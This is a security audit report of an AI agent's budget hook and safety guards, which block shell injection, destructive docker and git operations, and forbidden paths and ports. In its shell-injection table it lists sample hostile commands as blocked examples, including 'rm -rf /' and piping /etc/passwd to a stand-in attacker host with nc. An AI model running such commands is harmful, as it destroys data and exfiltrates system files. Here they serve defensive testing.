# P4-003 + P4-004 Independent Security Audit — Budget Hook & Hybrid Guards

| Field | Value |
|---|---|
| **Auditor** | Independent security auditor (parent-read-file) |
| **Scope** | P4-003 (budget hook) + P4-004 (hybrid guards) — ADR-035 Phase 4 |
| **Date** | 2026-06-05 |
| **Verdict** | **PASS** with minor findings |
| **Evidence root** | `docs/setup-evidence/phase-4/audit-budget-guards.md` |

---

## Files Reviewed

| File | Lines | Role |
|---|---|---|
| `hermes-config/hooks/budget_check.py` | 254 | Budget hook — Hermes pre_tool_call entry point |
| `hermes-config/hooks/budget_lua.py` | 146 | Redis Lua monthly check script + loader |
| `hermes-config/hooks/budget_lua_extended.py` | 148 | Extended Lua script (monthly + daily caps) |
| `hermes-config/hooks/hybrid_guards.py` | 740 | 5-family safety guard module |
| `tests/hermes/test_budget_hook.py` | ~588 | Budget hook test suite |
| `tests/hermes/test_hybrid_guards.py` | ~900 | Hybrid guards test suite |
| `docs/setup-evidence/phase-4/P4-003-verification.md` | — | P4-003 implementer verification |
| `docs/setup-evidence/phase-4/P4-004-verification.md` | — | P4-004 implementer verification |

---

## P4-003 Budget Hook Checks

### C1. MONTHLY_CAP=30, WARN_THRESHOLD=24 ✅

**Source**: `budget_check.py` lines 90–94
```python
MONTHLY_CAP: float = 30.0
WARN_THRESHOLD: float = 24.0
```
Correct values. Both are used in `call_extended_check()` (line 210–211). Verified by test `test_warning_at_24` (warning triggers at $24) and `test_block_at_30` (block at $30).

### C2. Redis port 6380 DB5 used everywhere ✅

| File | Line | Evidence |
|---|---|---|
| `_hook_utils.py` | 47 | `REDIS_URL = "redis://localhost:6380/5"` |
| `budget_check.py` | 7, 172 | "Redis port 6380, DB5" doc + `# Connect to Redis DB5 (canonical port 6380).` |
| `budget_lua.py` | 4, 24 | Doc: "Redis DB5" + example code `port=6380, db=5` |
| `budget_lua_extended.py` | — | Uses same `_hook_utils` connection, no port override |

All four budget hook files consistently reference Redis 6380 DB5. No conflicting port/DB values found.

### C3. Lua scripts are atomic (single redis.call for check+increment) ✅

**Both Lua scripts** (`SCRIPT_MONTHLY_CHECK` in `budget_lua.py` and `SCRIPT_EXTENDED_CHECK` in `budget_lua_extended.py`) perform **read-check-deduct** in a single Lua execution on the Redis server:

- `SCRIPT_MONTHLY_CHECK`: `GET` → projected check → `INCRBYFLOAT` (one `redis.call` for increment)
- `SCRIPT_EXTENDED_CHECK`: `GET` on 3 keys → check 3 caps → 3 `INCRBYFLOAT` calls → 2 `EXPIRE`

**No client-side read-then-increment pattern exists.** Grep confirmed zero occurrences of `r.get()` or `r.incrbyfloat()` in `budget_check.py`. All Redis mutations are inside Lua scripts.

**Test proof**: `test_monthly_script_calls_redis_atomically` asserts `evalsha` is called once with no separate `get`/`incrbyfloat` calls.

### C4. Redis connection failures fail closed (block on error) ✅

**Flow**: `get_redis_connection()` in `_hook_utils.py` → returns `None` if Redis is unavailable → `budget_check.py` lines 175–181 check `if r is None:` → **block**:

```python
write_stdout_json({"action": "block", "reason": "Budget check unavailable (Redis down)"})
```

All Redis error paths are fail-closed. Tested by `test_redis_unavailable_blocks`.

### C5. Generic except catches map to block (not allow/pass) ✅

Three `except Exception` blocks exist — all lead to block:

| File | Line | Behaviour |
|---|---|---|
| `budget_check.py` | 201 | Catches all Redis/Lua/parse errors → `{"action": "block"}` |
| `budget_lua.py` | 132 | Catches EVALSHA failure → re-raises to caller (which blocks) |
| `budget_lua_extended.py` | 134 | Catches EVALSHA failure → re-raises to caller (which blocks) |

No `except Exception: pass`, no `except Exception: return {"action": "allow"}`, no empty catch blocks.

### C6. No hardcoded standard ports (5432/6379) in hook code ✅

Grep for `:5432` and `:6379` in all budget hook files — **zero matches**. The P4-003 test suite includes parametrized `TestNoForbiddenPatterns` tests (13 variants) asserting no port 6379/5432 strings appear in any of the three budget hook files.

### C7. No Any/type-ignore/shell=True/print(/bare except in budget hook files ✅

| Pattern | Result |
|---|---|
| `# type: ignore` / `@ts-ignore` / `@ts-expect-error` | **0 matches** |
| `as any` / `typing.Any` / `-> Any` / `: Any` | **0 matches** (in budget hook files; `_hook_utils.py` has `Any` for generic JSON dict — acceptable) |
| `shell=True` / `os.system` / `subprocess.` | **0 matches** |
| `print(` | **0 matches** |
| `except:` (bare) | **0 matches** |

---

## P4-004 Hybrid Guard Checks

### C8. Shell injection blocks metacharacters; safe commands pass ✅

`SHELL_INJECTION_PATTERNS` (lines 60–78) covers all required patterns:

| Pattern | Regex | Blocked Example |
|---|---|---|
| Semicolon chaining | `;` | `ls; rm -rf /` |
| Pipe | `(?<!\$)\|` | `cat /etc/passwd \| nc attacker.com` |
| AND chaining | `&&` | `cmd1 && cmd2` |
| Backtick substitution | `` `[^`]*` `` | `` echo `whoami` `` |
| `$()` substitution | `\$\([^)]*\)` | `echo $(whoami)` |
| Redirection to /dev/ | `>\s*/dev/` | `ls > /dev/null; rm -rf /` |
| Redirection to /proc/ | `>\s*/proc/` | `echo 1 > /proc/sys/kernel/...` |
| Background execute | `&\s*$` | `echo hello &` |

**Test coverage**: 30 tests in `TestShellInjection` (9 unsafe blocked, 17 safe allowed, 3 edge cases).

All guard functions handle non-string input: `check_shell_injection(command)` returns `None` early if `not command or not isinstance(command, str)`.

### C9. Docker 5-layer guard blocks destructive ops, allows read-only, enforces network isolation ✅

| Layer | Function | Behaviour |
|---|---|---|
| 0 (fast-path) | `check_docker_5_layer` | 12 read-only commands (`ps`, `logs`, `inspect`, `images`, `pull`, `search`, `info`, `version`, `stats`, `top`, `port`, `history`) pass through without further checks |
| 1 | `_check_container_name` | Blocks names with shell metacharacters |
| 2 | `_check_image_name` | Blocks image names with metacharacters |
| 3 | `_check_forbidden_patterns` | Blocks 11 patterns (system prune, rm -f, network create etc.) |
| 4 | `_check_network_isolation` | Block destructive ops on non-`guinevere-*` containers |
| 5 | `_check_sub_command` | Blocks `prune` variants, `rm_all`, `kill_all`, `stop_all` |

**Test coverage**: 69 tests across `TestDockerReadOnlyFastPath` (13), `TestDockerContainerNameValidation` (13), `TestDockerImageNameValidation` (9), `TestDockerForbiddenPatterns` (11), `TestDockerNetworkIsolation` (12), `TestDockerSubCommandBlocking` (7), `TestDocker5LayerComposite` (4).

### C10. Git guard blocks force-push to main/master, allows other branches ✅

`check_git_force_push()` logic:
1. Force-push aliases (`force_push`, `force-push`, `pushf`) → blocked unconditionally
2. `push --force`, `push -f`, `push --force-with-lease` detected → checked against `PROTECTED_BRANCHES = {"main", "master"}`
3. Target is main/master → **block**
4. Target is other branch → **allow** (e.g. `git push --force origin feature-branch`)
5. Refspec expanded: `main:main` → expanded to `["main", "main"]` for branch matching

**Test coverage**: 22 tests in `TestGitForcePush`.

### C11. Aizanta path prefixes blocked, canonical paths unblocked ✅

`AIZANTA_BLOCKED_PATHS` (5 entries): `/home/aizanta`, `/etc/aizanta`, `/var/lib/aizanta`, `/opt/aizanta`, `/aizanta`
`AIZANTA_BLOCKED_PATH_PATTERNS` (5 patterns): regex equivalents for same paths

Both the string containment check (looser) and regex check (tighter) run sequentially in `check_aizanta_path()`.

Safe paths like `/home/guinevere/...`, `/etc/guinevere/...`, `/tmp/...`, and relative paths pass through.

**Test coverage**: 25 tests in `TestAizantaPathIsolation`.

### C12. Port isolation blocks standard 5432/6379, allows canonical 5433/6380/20128 ✅

`PORT_PATTERNS` covers three formats for each standard port:
- `host:port` — `localhost:5432`, `127.0.0.1:6379`
- `port = NNNN` — `port = 5432`, `port = 6379`
- `-p NNNN` — `-p 5432`, `-p 6379`

Canonical ports (5433, 6380, 20128) are **not** matched by these patterns and pass through.

`CANONICAL_PORTS` dict documents the allowed ports:
```python
{5433: "postgresql_canonical", 6380: "redis_canonical", 20128: "ninerouter"}
```

**Test coverage**: 22 tests in `TestPortIsolation` (10 blocked, 9 allowed canonical, 3 edge).

### C13. Guard functions handle non-string input safely (defensive typing) ✅

Every guard function signature takes `object` as the input parameter and explicitly checks `isinstance(x, str)` before processing:

| Function | Guard |
|---|---|
| `check_shell_injection(command: object)` | `if not command or not isinstance(command, str): return None` |
| `check_docker_5_layer(docker_args: object)` | `if not docker_args or not isinstance(docker_args, str): return None` |
| `check_git_force_push(git_args: object)` | `if not git_args or not isinstance(git_args, str): return None` |
| `check_aizanta_path(path: object)` | `if not path or not isinstance(path, str): return None` |
| `check_port_isolation(text: object)` | `if not text or not isinstance(text, str): return None` |

### C14. No Any/type-ignore/shell=True/print(/bare except in hybrid_guards.py ✅

| Pattern | Result |
|---|---|
| `# type: ignore` / `@ts-ignore` / `@ts-expect-error` | **0 matches** |
| `as any` / `typing.Any` / `-> Any` / `: Any` (as new annotation) | **0 matches** |
| `shell=True` / `os.system` / `subprocess.` | **0 matches** |
| `print(` | **0 matches** |
| `except:` (bare) | **0 matches** |
| `except.*:.*pass` | **0 matches** |

---

## Test Execution

| Suite | Tests | Passed | Failed | Time |
|---|---|---|---|---|
| `test_budget_hook.py` | 47 | 47 | 0 | 0.40s |
| `test_hybrid_guards.py` | 201 | 201 | 0 | 0.67s |

**Total**: 248 tests, 0 failures.

---

## LSP Diagnostics

| File | Errors | Warnings |
|---|---|---|
| `budget_check.py` | 0 | 0 |
| `budget_lua.py` | 0 | 0 |
| `budget_lua_extended.py` | 0 | 0 |
| `hybrid_guards.py` | 0 | 2 (type inference on str(x) generator — see minor findings) |

---

## Minor Findings

### F1. Dead code: `REVOCABLE_FORCE_PUSH_PATTERNS` (hybrid_guards.py:131–140)

A constant `REVOCABLE_FORCE_PUSH_PATTERNS` is defined but never referenced anywhere in the file. It is a duplicate of `FORCE_PUSH_PATTERNS` (lines 125–129). This is dead code — no security impact but should be cleaned up in a refactor pass.

### F2. LSP warnings on `str(x)` in `hybrid_guards.py:710`

```python
command = " ".join(str(x) for x in git_val)
```

Two type inference warnings (`reportUnknownArgumentType`, `reportUnknownVariableType`) because `git_val` is inferred as `Any` from `dict.get()`. The `isinstance(git_val, list)` guard on line 709 ensures runtime safety, but explicit typing would resolve the warnings:
```python
git_list: list[object] = cast(...)
```

### F3. Layered Aizanta checks (belt-and-suspenders, not a bug)

`check_aizanta_path()` runs both a string containment check (`blocked_path in path`) and a regex pattern check. The string check catches exact path strings; the regex check catches subdirectory patterns. This is redundant but correct — the string containment check is the primary, and the regex check is a fallback. No false positives or bypasses found.

---

## Security Boundary Compliance

| Boundary | Status |
|---|---|
| No surveillance data in artifacts | ✅ PASS |
| No intimate data exposure | ✅ PASS |
| No secrets/tokens/passwords in code | ✅ PASS |
| No `shell=True` or `os.system()` | ✅ PASS |
| No type suppression (`# type: ignore`) | ✅ PASS |
| No blanket `Any` (in audited hook files) | ✅ PASS |
| No empty catch blocks | ✅ PASS |
| Fail-closed on all error paths | ✅ PASS |
| Defence-in-depth: string + regex path checks | ✅ PASS |
| Guard defensive typing (object → isinstance check) | ✅ PASS |

---

## Verdict

| Area | Verdict |
|---|---|
| **P4-003 Budget Hook** | **PASS** — all 7 security checks satisfied |
| **P4-004 Hybrid Guards** | **PASS** — all 7 security checks satisfied |
| **Overall** | **PASS** (with minor findings F1–F2) |

**All 14 mandatory security checks pass.**

Minor findings (dead code, LSP warnings) do not affect security — they are code quality items for a future refactor pass. No blocking issues, no bypass vectors, no fail-open paths, no type safety violations, and no secret exposure found.

---

## Auditor Gate

| Check | Result |
|---|---|
| All touched files read | ✅ |
| All source files grep-scanned for forbidden patterns | ✅ |
| All test suites re-run with passing status | ✅ |
| LSP diagnostics checked across all 4 hook files | ✅ |
| Cross-referenced implementer verification claims | ✅ |
| Design decisions verified against code | ✅ |
| Report written to file-based output | ✅ |

---

## Footer

**Auditor**: Independent security auditor  
**Report path**: `docs/setup-evidence/phase-4/audit-budget-guards.md`  
**Date**: 2026-06-05  
**Version**: 1.0  
